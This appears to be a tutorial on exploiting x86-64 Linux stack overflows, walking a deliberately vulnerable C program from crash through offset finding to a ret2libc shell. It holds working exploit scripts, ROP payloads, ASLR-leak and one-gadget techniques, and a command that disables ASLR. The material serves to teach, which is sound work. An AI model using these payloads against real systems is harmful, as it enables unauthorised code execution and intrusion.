Stack Overflows

Stack overflow exploitation methodology - crash analysis, offset determination, ret2libc, and a complete end-to-end walkthrough on x86-64 Linux.

Overview

A stack overflow happens when a program writes past a fixed-size buffer on the stack and overwrites the saved return address. Because the return address decides where execution resumes, an attacker who controls it can redirect the program. This article walks a repeatable methodology: crash the target, find the offset, verify control of the instruction pointer, locate system and /bin/sh , and build a ret2libc chain. By the end you can take a vulnerable x86-64 Linux binary from crash to shell.

Required Reading

  • Buffer Overflows - buffer overflow fundamentals, unsafe functions, return address overwrite, canaries, NX
  • Stack - stack frame layout, prologue/epilogue, RBP/RSP, the call/ret mechanism

A Complete Methodology

Stack overflow exploitation follows a repeatable methodology. Starting from a crash, progressing through offset determination, control verification, and ultimately code execution. The methodology has steps, and each step either works or it doesn't - no guesswork.

The steps:

1. Trigger the crash - confirm the vulnerability
2. Determine the offset - where does RIP get overwritten?
3. Verify control - prove you can set RIP to arbitrary values
4. Find useful addresses - system(), "/bin/sh", gadgets
5. Build the exploit - construct the payload
6. Debug and iterate - fix alignment, bad bytes, offsets

Step 1 - Trigger the Crash

Start with a vulnerable program:

// vuln.c - Deliberately vulnerable server-like program
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void handle_input(char *buffer) {
    char local[128];
    strcpy(local, buffer);  // VULNERABLE - no bounds check
    printf("Received: %s\n", local);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        char input[1024];
        ssize_t n = read(STDIN_FILENO, input, sizeof(input));
        if (n > 0) {
            input[n] = '\0';
            handle_input(input);
        }
    } else {
        handle_input(argv[1]);
    }
    return 0;
}

Compile without protections for the walkthrough:

$ gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

Trigger the crash:

$ python3 -c "print('A' * 300)" | ./vuln
Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAA
Segmentation fault (core dumped)

Step 2 - Determine the Offset

Generate a cyclic pattern (De Bruijn sequence) to find exactly which bytes land in RIP :

$ python3 -c "from pwn import *; print(cyclic(300, n=8).decode())"

Run under GDB:

$ python3 -c "from pwn import *; print(cyclic(300, n=8).decode())" > pattern.txt
$ gdb ./vuln
(gdb) run < pattern.txt
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011b6 in handle_input ()
(gdb) x/gx $rsp
0x7fffffffe010: 0x636161716361616f

Read the 8 bytes at RSP (where ret pops into RIP ):

$ python3 -c "from pwn import *; print(cyclic_find(0x636161716361616f, n=8))"
136

The offset to RIP is 136 bytes: buffer (128) + saved RBP (8) = 136. This matches.

Verify:

$ python3 -c "print('A'*136 + 'B'*8)" > verify.txt
$ gdb ./vuln
(gdb) run < verify.txt
Program received signal SIGSEGV, Segmentation fault.
(gdb) x/gx $rsp
0x7fffffffe010: 0x4242424242424242   # "BBBBBBBB"
(gdb) info registers rip
rip            0x4242424242424242

RIP = 0x4242424242424242. We have complete control of the return address at offset 136.

Step 3 - Verify Control

Write a quick script to test arbitrary addresses:

# control_test.py
import struct
import sys

offset = 136
target = 0x4142434445464748  # "ABCDEFGH"

payload = b"A" * offset + struct.pack("<Q", target)
sys.stdout.buffer.write(payload)
						
$ python3 control_test.py > control.bin
$ gdb -ex "run < control.bin" ./vuln
Program received signal SIGSEGV.
(gdb) info registers rip
rip            0x4142434445464748

RIP is exactly the target value. Control is confirmed.

Step 4 - Find Useful Addresses

Finding 'system()'

$ gdb ./vuln
(gdb) break main
(gdb) run
(gdb) print system
$1 = {int (const char *)} 0x7ffff7c591a0 <__libc_system>

Finding '/bin/sh'

(gdb) find &system,+9999999,"/bin/sh"
0x7ffff7db8d88
1 pattern found.

Or with pwntools:

$ python3 -c "
from pwn import *
libc = ELF('/usr/lib/libc.so.6')
print(f'system:    {hex(libc.symbols[\"system\"])}')
print(f'/bin/sh:   {hex(next(libc.search(b\"/bin/sh\")))}')
"
system:    0x50d70
/bin/sh:   0x1d8678

These are offsets within libc. Add libc's base address at runtime to get absolute addresses.

Finding 'pop rdi; ret'

$ ROPgadget --binary ./vuln | grep "pop rdi"
0x000000000040120b : pop rdi ; ret

Finding 'ret' (for stack alignment)

$ ROPgadget --binary ./vuln | grep ": ret$"
0x000000000040101a : ret

A lone ret gadget is useful for 16-byte stack alignment. Sometimes system() crashes because RSP is not 16-byte aligned when system() executes. Adding a ret gadget before system() shifts RSP by 8, fixing the alignment.

Step 5 - Build the Exploit

The ret2libc strategy: overwrite return address -> pop rdi; ret -> "/bin/sh" address -> system() address. On x86-64, the first argument goes in RDI. The pop rdi gadget pops the next value on the stack into RDI, then returns to the next address.

# exploit_ret2libc.py
import struct
import sys

offset = 136

# Offsets from libc base
libc_system  = 0x50d70
libc_bin_sh  = 0x1d8678

# Known libc base (ASLR disabled for learning)
libc_base = 0x7ffff7dc1000

# Compute absolute addresses
system_addr = libc_base + libc_system
bin_sh_addr = libc_base + libc_bin_sh

# Gadget (from our binary)
pop_rdi_ret = 0x40120b
ret_gadget  = 0x40101a  # For stack alignment

payload  = b"A" * offset
payload += struct.pack("<Q", ret_gadget)   # Align stack (optional, if needed)
payload += struct.pack("<Q", pop_rdi_ret)  # pop rdi; ret
payload += struct.pack("<Q", bin_sh_addr)  # value -> RDI
payload += struct.pack("<Q", system_addr)  # call system("/bin/sh")

sys.stdout.buffer.write(payload)

Anatomy of the ROP Chain

What happens when the vulnerable function executes ret :

RSP before ret points to ret_gadget:

Stack layout (RSP moving upward):
+-----------------+  <- RSP after leave (rbp restored, pointing here)
| ret_gadget      |  <- first ret pops this -> RIP
+-----------------+  RSP += 8
| pop_rdi_ret     |  <- ret_gadget's ret pops this -> RIP
+-----------------+  RSP += 8
| bin_sh_addr     |  <- pop_rdi_ret's pop reads this -> RDI
+-----------------+  RSP += 8 (pop increments RSP)
| system_addr     |  <- pop_rdi_ret's ret pops this -> RIP
+-----------------+
| (system's frame)|  <- system() starts executing here

CPU instruction trace:

1. ret          -> RIP = ret_gadget
2. ret          -> RIP = pop_rdi_ret   (pops next word, does nothing else)
3. pop rdi      -> RDI = bin_sh_addr
4. ret          -> RIP = system_addr   (calls system with RDI = "/bin/sh")

Step 6 - Debug and Iterate

Test the exploit:

$ python3 exploit_ret2libc.py > payload.bin
$ gdb ./vuln
(gdb) run < payload.bin

If the exploit fails at system() , common causes:

1. Stack misalignment. Check RSP when system is called:

(gdb) break *system
(gdb) run < payload.bin
(gdb) print $rsp
$1 = 0x7fffffffe038
(gdb) print $rsp & 0xf
$2 = 0x8   # 8 means misaligned - should be 0x0

Fix: add a ret gadget before system() to shift RSP by 8.

2. libc base wrong. Dump /proc/<pid>/maps to verify:

(gdb) info proc mappings
          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x555555554000     0x555555555000     0x1000        0x0  r--p   /home/user/vuln
      0x7ffff7dc1000     0x7ffff7de8000    0x27000        0x0  r--p   /usr/lib/libc.so.6
      0x7ffff7de8000     0x7ffff7f72000   0x18a000    0x27000  r-xp   /usr/lib/libc.so.6

The base is the first address of the first mapping (or the one with offset 0).

3. MOVAPS issue. Some versions of glibc use movaps which requires 16-byte-aligned RSP. Fix with a ret gadget or by entering system() with RSP % 16 == 0.

Resolving addresses dynamically with pwntools (no ASLR disabling needed for a local process):

# exploit_pwnlib.py - Uses pwntools for automatic address resolution
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Start the process locally
p = process('./vuln')

# Or connect to a remote service:
# p = remote('target.example.com', 1337)

elf = ELF('./vuln')
libc = ELF('/usr/lib/libc.so.6')

# Find pop rdi; ret in our binary
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# libc functions (offsets - need leak or known base for absolute addresses)
# For a local process with no ASLR:
offset = 136

payload = flat(
    b'A' * offset,
    ret,            # Stack alignment
    pop_rdi,        # pop rdi; ret
    0xdeadbeef,     # Placeholder for "/bin/sh" address
    0xcafebabe,     # Placeholder for system address
)

p.sendline(payload)
p.interactive()

Bypassing ASLR

ASLR randomizes libc's base address. On every run, libc loads at a different address. The exploit must discover the base address at runtime through one of these techniques:

1. Leak a return address from the stack

If the program's output includes any stack data (e.g., %s format string, error messages that print buffer contents), you can leak a return address that points into __libc_start_main . Subtract the known offset to get libc's base:

# If you can leak a __libc_start_main return address:
leaked_libc_start_main = unpack(leaked_bytes, 'all')
libc_base = leaked_libc_start_main - 0x29d90  # offset may vary by glibc version
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

2. GOT dereference

If you can read from an arbitrary address (format string bug, arbitrary read), read a resolved GOT entry:

# leak puts@GOT
# puts@GOT contains the resolved address of puts in libc
puts_got_addr = elf.got['puts']
# Read 8 bytes from puts_got_addr -> resolved_puts_addr
libc_base = resolved_puts_addr - libc.symbols['puts']

Ret2plt

Instead of jumping to libc directly, jump to the PLT entry for system . The PLT is part of your executable, so its address is static (if PIE is disabled):

$ objdump -d ./vuln | grep "@plt>:" | head
0000000000401030 <puts@plt>:
0000000000401040 <printf@plt>:

But beware: system may not be imported by the program. If it's not in the PLT, this approach doesn't work. You'd need to resolve the libc address (as above) or use ret2dlresolve (a more advanced technique that tricks the dynamic linker into resolving any function you want).

Ret2dlresolve

When the PLT doesn't contain the function you need, ret2dlresolve forges the structures the dynamic linker uses to resolve symbols, tricking it into resolving system even though the binary never originally imported it.

The idea: the dynamic linker resolves PLT entries by reading Elf64_Rela , Elf64_Sym , and string table entries. If you can write these structs into known memory locations and redirect the resolver to your forged entries, ld.so will resolve any symbol you want:

# Conceptual ret2dlresolve (simplified)
# Write fake Elf64_Rela, Elf64_Sym, and "system\0" string into BSS
# Set up the stack so that PLT[0] -> _dl_runtime_resolve uses your fake structures
fake_rela = p64(fake_got_addr) + p64(R_X86_64_JUMP_SLOT | (sym_index << 32)) + p64(0)
fake_sym = p64(st_name_offset) + p32(0) + ...  # Point to "system\0"

# On the stack:
payload  = b'A' * offset
payload += p64(plt0)       # Jump to PLT[0] (the resolver entry)
payload += p64(reloc_index) # Fake JMPREL index pointing to your fake_rela
payload += p64(ret_addr)    # Where to return after system() finishes
payload += p64(bin_sh_addr) # Argument for system

The x86-64 vs x86 Difference

32-bit x86 uses a completely different calling convention. Arguments are passed on the stack, not in registers:

Property x86-64 (System V) x86 (cdecl)
Arg 1 RDI
Arg 2 RSI
Arg 3 RDX
Return value RAX EAX
Stack alignment 16 bytes before call 4 bytes
Return address size 8 bytes 4 bytes

In x86 ret2libc, you don't need a pop rdi gadget - you just place the argument on the stack:

32-bit ret2libc payload:
[AAAA] * offset
[system_addr]     <- return address
[exit_addr]       <- system()'s return address (or "AAAA")
[bin_sh_addr]     <- first argument to system

The stack IS the argument passing mechanism. This makes 32-bit exploitation simpler but also makes the calling convention itself a larger attack surface (every argument is on the stack, adjacent to the buffer).

Endianness Considerations

x86 and x86-64 are little-endian. Multi-byte values are stored with the least significant byte at the lowest address:

uint64_t value = 0x00007FFFF7C591A0;

Memory representation (low to high address):
A0 91 C5 F7 FF 7F 00 00

In Python:

import struct
addr = 0x00007FFFF7C591A0
packed = struct.pack("<Q", addr)  # Little-endian
print(packed.hex())                # a091c5f7ff7f0000

When writing addresses into a payload, always pack them as little-endian on x86/x86-64.

Avoiding Bad Characters

Some programs process input through functions that interpret certain bytes specially:

Character Context Problem
0x00 (null) strcpy, gets, scanf Terminates string copy
0x0A (newline) gets, fgets, readline Terminates input
0x0D (carriage return) gets Terminates input
0x20 (space) scanf("%s") Terminates input
0xFF Various May trigger EOF or special handling

If the address you need to write (e.g., 0x00007FFFF7C591A0 ) contains a null byte, you need to adjust. Options:

  1. Partial overwrite : Only overwrite the lower bytes (the null bytes in the address are the upper bytes, which might already be correct if RBP is already mostly the right value)
  2. Find alternative gadgets whose addresses don't contain bad chars
  3. Use 'read()' or 'recv()' syscalls that don't stop at null bytes
def has_bad_chars(data, bad_chars=b'\x00\x0a'):
    return any(c in data for c in bad_chars)

addr = 0x7ffff7c591a0
packed = struct.pack("<Q", addr)
if has_bad_chars(packed):
    print(f"WARNING: Address {hex(addr)} contains bad chars")
    # Try a different gadget or technique

NOP Sleds

When you know roughly where your shellcode is (within a few hundred bytes) but not precisely, use a NOP sled. The nop instruction ( \x90 on x86/x86-64) does nothing and advances to the next instruction. A long sequence of NOPs followed by the shellcode means any jump into the NOP region will slide to the shellcode:

+--------------------+
| Garbage            |
+--------------------+
| \x90\x90\x90...    |  <- Return here (approximate)
| \x90\x90\x90...    |  <- Slide down
| \x90\x90\x90...    |
+--------------------+
| Shellcode          |  <- Eventually reaches here
+--------------------+
						
nop_sled = b"\x90" * 100
shellcode = b"..."  # your shellcode
padding   = b"A" * (offset - len(nop_sled) - len(shellcode))
ret_addr  = struct.pack("<Q", approx_buffer_addr + 30)  # aim for middle of sled

payload = nop_sled + shellcode + padding + ret_addr

NOP sleds are less relevant now because of NX - you can't execute shellcode on the stack anyway. For ret2libc and ROP chains, precision is required.

One Gadgets

system() is convenient but not always available. Glibc contains "one-gadget" magic addresses

  • short instruction sequences that directly call execve("/bin/sh", NULL, NULL) without needing

to set RDI manually:

$ sudo pacman -S one_gadget  # or: gem install one_gadget
$ one_gadget /usr/lib/libc.so.6
0x5225e posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0x52261 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  [rsp+0x1c] == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xdd867 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

A one-gadget is just an address in libc that, if you jump to it while satisfying the listed constraints, gives you a shell. The constraints describe the register/memory conditions that must hold:

# Using one-gadget
libc_base = leaked_addr - offset_in_libc
one_gadget = libc_base + 0xdd867

payload = b"A" * offset + struct.pack("<Q", one_gadget)

The appeal of one-gadgets is simplicity - no need to find pop rdi gadgets or a /bin/sh string. The constraints must be checked in GDB at the point of exploitation.

A Production Exploit Script

A final exploit that handles the full methodology:

#!/usr/bin/env python3
# exploit_final.py - Production-quality stack overflow exploit
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

TARGET = './vuln'

def find_offset():
    """Step 2: Determine offset to RIP."""
    p = process(TARGET)
    p.sendline(cyclic(300, n=8))
    p.wait()
    core = p.corefile
    rip_pattern = core.read(core.rsp, 8)
    offset = cyclic_find(rip_pattern, n=8)
    log.info(f"Offset to RIP: {offset}")
    return offset

def build_payload(offset, libc_base):
    """Step 5: Build the exploit payload."""
    libc = ELF('/usr/lib/libc.so.6')
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    rop = ROP(ELF(TARGET))
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    payload = flat(
        b'A' * offset,
        ret,            # Stack alignment
        pop_rdi,        # pop rdi; ret
        bin_sh,         # -> RDI
        system,         # system("/bin/sh")
    )
    return payload

def main():
    offset = find_offset()

    # For local testing with ASLR disabled
    libc = ELF('/usr/lib/libc.so.6')
    libc_base = 0x7ffff7dc1000  # Hard-coded for ASLR-off testing

    payload = build_payload(offset, libc_base)
    log.info(f"Payload: {payload.hex()}")

    p = process(TARGET)
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()

The Full Crash-to-Shell Checklist

[ ] Confirm crash with oversized input
[ ] Generate cyclic pattern, run under GDB, read RIP value
[ ] Calculate offset (cyclic_find or manual subtraction)
[ ] Verify control (A's + B's -> RIP = BBBB...)
[ ] Identify bad characters (null, newline, etc.)
[ ] Build payload skeleton with correct offset
[ ] Compile with -no-pie if PIE is on (or leak PIE base)
[ ] Disable ASLR (echo 0 > /proc/sys/kernel/randomize_va_space) for testing
[ ] Find pop rdi; ret gadget (ROPgadget)
[ ] Find ret gadget for alignment
[ ] Find system() and "/bin/sh" addresses
[ ] Construct final payload
[ ] Test under GDB
[ ] Fix alignment issues (add ret gadgets until RSP % 16 == 0)
[ ] Re-enable ASLR, implement leak for actual exploit
[ ] Test outside GDB (environment variables shift stack slightly)
[ ] Adjust for environment shift (add NOP sled or adjust addresses)

Each checked box represents progress. The methodology is linear - when one step fails, the fix is in that step. No shotgun debugging, no guessing. This is engineering, not wizardry.

Challenge

Reimplement the offset-finding step in Go. Generate a de Bruijn pattern over a small alphabet, search it for the 8 bytes you leaked from RSP in GDB, and print the byte offset. Compile the vulnerable program from Step 1, feed it a 300-byte pattern, and confirm the tool reports the same offset that cyclic_find did (136).

package main

import (
	"bytes"
	"fmt"
	"os"
	"strconv"
)

const alphabet = "abcd"

func deBruijn(k, n int) []byte {
	a := make([]int, k*n)
	sequence := make([]byte, 0, 1)

	var db func(t, p int)
	db = func(t, p int) {
		if t > n {
			if n%p == 0 {
				for j := 1; j <= p; j++ {
					sequence = append(sequence, alphabet[a[j]])
				}
			}
			return
		}
		a[t] = a[t-p]
		db(t+1, p)
		for j := a[t-p] + 1; j < k; j++ {
			a[t] = j
			db(t+1, t)
		}
	}
	db(1, 1)
	return sequence
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "usage: %s <pattern|find> <length|bytes>\n", os.Args[0])
		os.Exit(1)
	}

	pattern := deBruijn(len(alphabet), 8)

	if os.Args[1] == "pattern" {
		length, _ := strconv.Atoi(os.Args[2])
		for i := 0; i < length; i++ {
			fmt.Printf("%c", pattern[i%len(pattern)])
		}
		fmt.Println()
		return
	}

	target := []byte(os.Args[2])
	search := append(append([]byte{}, pattern...), pattern[:7]...)
	offset := bytes.Index(search, target)
	if offset < 0 {
		fmt.Fprintf(os.Stderr, "no match for %q\n", target)
		os.Exit(1)
	}
	fmt.Printf("offset: %d\n", offset)
}

Build it and use the same pattern as the payload:

go build -o cyclic cyclic.go
./cyclic pattern 300 > pattern.txt
./cyclic find "$(head -c 144 pattern.txt | tail -c 8)"
# offset: 136

Feed pattern.txt to the vulnerable program under GDB and confirm the 8 bytes at RSP match the bytes at offset 136.
